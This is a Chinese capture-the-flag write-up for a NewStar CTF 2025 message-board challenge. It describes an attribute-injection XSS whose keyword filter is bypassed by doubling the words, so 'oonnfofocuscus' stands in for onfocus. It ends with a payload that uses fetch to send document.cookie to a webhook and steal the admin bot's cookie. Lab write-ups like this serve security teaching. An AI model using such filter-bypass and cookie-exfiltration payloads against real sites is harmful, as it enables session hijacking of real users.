---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

# 小 E 的留言板

给了 webhook 很明显要打 XSS。

新建一个用户，随便写点什么提交，发现我们的输入以 input 标签的 value 值被注入了 html

```html
<input type="text" class="form-control" value="1" readonly="" style="
        background: transparent;
        border: none;
        padding: 0;
        font-size: 16px;
        width: 100%;
      ">
```

这里上 [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) 找一个 input 元素的 payload 试一下，因为 bot 只是访问页面而不进行任何操作，所以我们就只能通过 `autofocus` + `onfocus` 或闭合标签后制造 `<script>` 标签，我们测试如下。

```html
<!-- pwned" onfocus="alert(1)" autofocus "whatever -->
<input type="text" class="form-control" value="pwned" ="alert(1)"="" auto="" "whatever"="" readonly="" style="
        background: transparent;
        border: none;
        padding: 0;
        font-size: 16px;
        width: 100%;
      ">
```

经过测试 `<` 和 `>` 被过滤，闭合标签不可行。发现 `on` 和 `focus` 也被过滤掉了，但是这里我们可以双写绕过如下：

```html
pwned" oonnfofocuscus="alert(1)" autofofocuscus "whatever
```

成功弹窗，然后编写偷 cookie 的 payload，提交并报告留言。

```html
pwned" oonnfofocuscus="fetch('http://localhost:9000/webhook/d91ab564/',{method:'POST',body:document.cookie})" autofofocuscus "whatever
```

得到 flag。
